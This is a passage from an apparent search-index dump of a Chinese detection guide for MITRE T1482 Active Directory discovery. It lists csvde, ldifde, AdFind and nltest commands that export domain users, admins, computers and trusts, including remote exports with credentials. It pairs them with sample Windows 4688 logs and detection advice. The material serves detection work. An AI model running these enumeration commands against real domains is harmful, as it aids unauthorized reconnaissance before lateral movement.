\u5907\u6ce8\uff1a\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u68c0\u6d4b\u8be5\u5f02\u5e38\u884c\u4e3a\uff0c\u91cd\u70b9\u53ef\u5173\u6ce8Windows\u5b89\u5168\u65e5\u5fd7\u4e2d\u76844688\u30015158\u30015156\u30014689\u4e8b\u4ef6\uff0c\u5176\u4e2d\u8fdb\u7a0b\u4fe1\u606f\u3001\u76ee\u6807\u7aef\u53e3\uff0853\u3001389\uff09\u53ef\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002 \u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -s 192.168.1.1 -a test\\admin Password -f all.txt \u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002 0x03 \u4f7f\u7528AdFind\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4e0b\u8f7d\u5730\u5740\uff1a https://www.joeware.net/freetools/tools/adfind/ \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1>all.tx \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person>user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer>machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=group>group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f \"(&(objectCategory=group)(name=Domain Admins))\">admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=organizationalUnit>ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person SamAccountName>username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer name>machinename.txt \u6a21\u62df\u6d4b\u8bd5\u6548\u679c C:\\Users\\12306br0\\Desktop\\AdFind>AdFind.exe -h 127.0.0.1>all.txt AdFind V01.52.00cpp Joe Richards (support@joeware.net) January 2020 \u6d4b\u8bd5\u7559\u75d5\u6548\u679c #windows\u5b89\u5168\u65e5\u5fd7\u8fdb\u7a0b\u521b\u5efa4688\uff0cWindows server 2016\u6d4b\u8bd5\u6548\u679c \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x10a4 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Users\\12306br0\\Desktop\\AdFind\\AdFind.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x69c \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: AdFind.exe -h 127.0.0.1 \u5efa\u8bae \u5907\u6ce8\uff1a\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u68c0\u6d4b\u8be5\u5f02\u5e38\u884c\u4e3a\uff0c\u91cd\u70b9\u53ef\u5173\u6ce8Windows\u5b89\u5168\u65e5\u5fd7\u4e2d\u76844688\u30015158\u30015156\u30014689\u4e8b\u4ef6\uff0c\u5176\u4e2d\u8fdb\u7a0b\u4fe1\u606f\u3001\u76ee\u6807\u7aef\u53e3\uff08389\uff09\u53ef\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002 \u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 192.168.1.1 -u test\\admin -up Password>all.txt \u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002 0x04 \u4f7f\u7528Nltest\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u8bf4\u660e\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731935(v=ws.11) \u4f7f\u7528\u8bed\u6cd5 nltest [/\u57df\u63a7\u670d\u52a1\u5668\uff1a <servername>] [<operation> [<parameter>] /server\uff1a<ServerName>\u5728\u60a8\u6307\u5b9a\u7684\u8fdc\u7a0b\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884cnltest\u3002\u5982\u679c\u672a\u6307\u5b9a\u6b64\u53c2\u6570\uff0c\u5219nltest\u5728\u672c\u5730\u8ba1\u7b97\u673a\uff08\u5373\u57df\u63a7\u5236\u5668\uff09\u4e0a\u8fd0\u884c\u3002 \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b \u663e\u793a\u57df\u7684\u4fe1\u4efb\u5173\u7cfb\u4e0b\u9762\u7684\u793a\u4f8b\u5217\u51fa\u4e86\u4e3a\u60a8\u7684\u57df\u5efa\u7acb\u7684\u4fe1\u4efb\u5173\u7cfb\u3002 nltest /domain_trusts \u6a21\u62df\u6d4b\u8bd5\u6548\u679c PS C:\\Users\\wangxin> nltest /domain_trusts \u57df\u4fe1\u4efb\u7684\u5217\u8868: 0: 361A 361a.com (NT 5) (Forest Tree Root) (Primary Domain) (Native) \u6b64\u547d\u4ee4\u6210\u529f\u5b8c\u6210 \u6d4b\u8bd5\u7559\u75d5\u6548\u679c #Windows\u5b89\u5168\u65e5\u5fd7\uff0c4688\u8fdb\u7a0b\u521b\u5efa\uff0cwindows server 2008 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 361A\\wangxin \u5e10\u6237\u540d: wangxin \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x23cb8 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa08 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\nltest.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x9e8 \u5efa\u8bae \u5907\u6ce8\uff1a\u5efa\u8bae\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u4e2d\u7684\u8fdb\u7a0b\u4fe1\u606f\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1482 https://attack.mitre.org/techniques/T1482/ \u6e17\u900f\u57fa\u7840\u2014\u2014\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u7684\u83b7\u53d62:Bypass AV https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%962_Bypass-AV","title":"T1482-win-\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u83b7\u53d6\u68c0\u6d4b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#t1482-win-","text":"","title":"T1482-win-\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u83b7\u53d6\u68c0\u6d4b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u6536\u96c6\u6709\u5173\u57df\u4fe1\u4efb\u5173\u7cfb\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u7528\u4e8e\u8bc6\u522bWindows\u591a\u57df\u6216\u8005\u6797\u73af\u5883\u4e2d\u7684\u6a2a\u5411\u79fb\u52a8\u7684\u673a\u4f1a\u3002\u57df\u4fe1\u4efb\u4e3a\u57df\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u4ee5\u5141\u8bb8\u57fa\u4e8e\u53e6\u4e00\u4e2a\u57df\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u8bbf\u95ee\u8d44\u6e90\u3002\u57df\u4fe1\u4efb\u5141\u8bb8\u53d7\u4fe1\u4efb\u57df\u7684\u7528\u6237\u8bbf\u95ee\u4fe1\u4efb\u57df\u4e2d\u7684\u8d44\u6e90\u3002\u53d1\u73b0\u7684\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u8fdb\u884cSID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165\u3001\u7968\u636e\u4f20\u9012\u548cKerberoasting\u3002\u53ef\u4ee5\u4f7f\u7528DSEnumerateDomainTrusts()Win32 API\u8c03\u7528\uff0c.NET\u65b9\u6cd5\u548cLDAP\u679a\u4e3e\u57df\u4fe1\u4efb\u3002\u5df2\u77e5Windows\u5b9e\u7528\u7a0b\u5e8fNltest\u88ab\u653b\u51fb\u8005\u7528\u6765\u679a\u4e3e\u57df\u4fe1\u4efb\u4fe1\u606f\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_1","text":"\u5728\u672c\u6587\u4e2d\u5c06\u4ecb\u7ecd\u4ee5\u4e0b\u5185\u5bb9\uff1a \u4f7f\u7528csvde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4f7f\u7528ldifde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4f7f\u7528AdFind\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f \u4f7f\u7528nltest\u83b7\u53d6\u57df\u5185\u4fe1\u606f\u5173\u7cfb","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_2","text":"Windows\u5b89\u5168\u65e5\u5fd7\u3001sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x01-csvde","text":"\u8bf4\u660e\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732101(v=ws.11) \u4f7f\u7528csvde\u5bfc\u51fa\u7684\u6587\u4ef6\u683c\u5f0f\u4e3acsv\uff0c\u53ef\u4ee5\u4f7f\u7528Microsoft Excel\u67e5\u770b \u9ed8\u8ba4\u53ea\u80fd\u5728\u4ee5\u4e0b\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f8b\u5982\uff1a Windows Server 2003 Windows Server 2008 Windows Server 2003 R2 Windows Server 2008 R2 Windows Server 2012, Windows Server 2003 with SP1 Windows 8 ~","title":"0x01 \u4f7f\u7528csvde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_4","text":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -f all.csv \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a csvde -f user.csv -r \"(&(objectCategory=person))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a csvde -f machine.csv -r \"(&(objectCategory=computer))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a csvde -f group.csv -r \"(&(objectCategory=group))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a csvde -f admin.csv -r \"(&(objectCategory=group)(name=Domain Admins))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a csvde -f ou.csv -r \"(&(objectCategory=organizationalUnit))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a csvde -f username.csv -r \"(&(objectCategory=person))\" -l SamAccountName \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a csvde -f machinename.csv -r \"(&(objectCategory=computer))\" -l name","title":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_5","text":"#\u57df\u63a7\u5236\u5668\u6a21\u62df\u6d4b\u8bd5\u6548\u679cwindows server 2016 C:\\Users\\12306br0>csvde -f all.csv \u8fde\u63a5\u5230\u201c(null)\u201d \u7528 SSPI \u4f5c\u4e3a\u5f53\u524d\u7528\u6237\u767b\u5f55 \u5c06\u76ee\u5f55\u5bfc\u51fa\u5230\u6587\u4ef6 all.csv \u641c\u7d22\u9879\u76ee... \u5199\u51fa\u9879\u76ee ............................................................................................................................................................................................................................... \u5bfc\u51fa\u5b8c\u6bd5\u3002\u540e\u7eed\u5904\u7406\u6b63\u5728\u8fdb\u884c... \u5bfc\u51fa\u4e86 223 \u4e2a\u9879\u76ee \u547d\u4ee4\u5df2\u6210\u529f\u5b8c\u6210","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_6","text":"#windows\u5b89\u5168\u65e5\u5fd74688\u8fdb\u7a0b\u521b\u5efa \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x12c0 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\csvde.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x1234 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: csvde -f all.csv","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_7","text":"\u5907\u6ce8\uff1a\u901a\u8fc7Windows\u5b89\u5168\u65e5\u5fd7\u53ef\u4ee5\u770b\u5230\uff0c\u5728\u8fdb\u7a0bcsvde\u521b\u5efa\u4e4b\u540e\uff1b\u4f1a\u8fdb\u884c\u7aef\u53e3\u7ed1\u5b9a\u6d3b\u52a8\u751f\u6210\u4e8b\u4ef65158\uff1b\u63a5\u7740\u8fdb\u884c\u7b5b\u9009\u8fde\u63a5\u884c\u4e3a\u751f\u6210\u4e8b\u4ef65156\uff0c\u7aef\u53e3389\uff1b\u6700\u540e\u5173\u95ed\u8fdb\u7a0b\u4e8b\u4ef64689.","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_8","text":"\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -s 192.168.1.1 -a test\\admin Password -f all.csv \u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002","title":"\u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x02-ldifde","text":"\u8bf4\u660e\u6587\u6863\uff1a https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731033(v=ws.11) \u4f7f\u7528ldifde\u5bfc\u51fa\u7684\u6587\u4ef6\u683c\u5f0f\u4e3aLDIF\uff0c\u53ef\u4ee5\u4f7f\u7528notepad.exe\u67e5\u770b","title":"0x02 \u4f7f\u7528ldifde\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_9","text":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -f all.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=person))\" -f user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=computer))\" -f machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group))\" -f group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group)(name=Domain Admins))\" -f admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=organizationalUnit))\" -f ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a ldifde -r \"(&(objectCategory=person))\" -l SamAccountName -f username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a ldifde -r \"(&(objectCategory=computer))\" -l name -f machinename.txt","title":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_10","text":"C:\\Users\\12306br0\\Desktop\\AdFind>ldifde -f all.txt \u8fde\u63a5\u5230\u201c12306BR0B4DD.361a.com\u201d \u7528 SSPI \u4f5c\u4e3a\u5f53\u524d\u7528\u6237\u767b\u5f55 \u5c06\u76ee\u5f55\u5bfc\u51fa\u5230\u6587\u4ef6 all.txt \u641c\u7d22\u9879\u76ee... \u5199\u51fa\u9879\u76ee............................................................................................................................................................................................................................... \u5bfc\u51fa\u4e86 223 \u4e2a\u9879\u76ee \u547d\u4ee4\u5df2\u6210\u529f\u5b8c\u6210 C:\\Users\\12306br0\\Desktop\\AdFind>","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_11","text":"\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x36D7FD \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xdd8 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\ldifde.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x69c \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: ldifde -f all.txt","title":"\u6d4b\u8bd5\u7559\u75d5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_12","text":"\u5907\u6ce8\uff1a\u57fa\u4e8eWindows\u5b89\u5168\u65e5\u5fd7\u68c0\u6d4b\u8be5\u5f02\u5e38\u884c\u4e3a\uff0c\u91cd\u70b9\u53ef\u5173\u6ce8Windows\u5b89\u5168\u65e5\u5fd7\u4e2d\u76844688\u30015158\u30015156\u30014689\u4e8b\u4ef6\uff0c\u5176\u4e2d\u8fdb\u7a0b\u4fe1\u606f\u3001\u76ee\u6807\u7aef\u53e3\uff0853\u3001389\uff09\u53ef\u4f5c\u4e3a\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_13","text":"\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -s 192.168.1.1 -a test\\admin Password -f all.txt \u6682\u65e0\u6a21\u62df\u6d4b\u8bd5\u4ee5\u53ca\u6d4b\u8bd5\u7559\u75d5\u6570\u636e\u3002","title":"\u4ece\u57df\u5916\u8fdc\u7a0b\u5bfc\u51fa\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#0x03-adfind","text":"\u4e0b\u8f7d\u5730\u5740\uff1a https://www.joeware.net/freetools/tools/adfind/","title":"0x03 \u4f7f\u7528AdFind\u83b7\u53d6\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_14","text":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1>all.tx \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person>user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer>machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=group>group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f \"(&(objectCategory=group)(name=Domain Admins))\">admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=organizationalUnit>ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person SamAccountName>username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer name>machinename.txt","title":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6d3b\u52a8\u76ee\u5f55\u4fe1\u606f\u793a\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_15","text":"C:\\Users\\12306br0\\Desktop\\AdFind>AdFind.exe -h 127.0.0.1>all.txt AdFind V01.52.00cpp Joe Richards (support@joeware.net) January 2020","title":"\u6a21\u62df\u6d4b\u8bd5\u6548\u679c"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1482-win-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%A3%80%E6%B5%8B/#_16","text":"#windows\u5b89\u5168\u65e5\u5fd7\u8fdb\u7a0b\u521b\u5efa4688\uff0cWindows server 2016\u6d4b\u8bd5\u6548\u679c \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 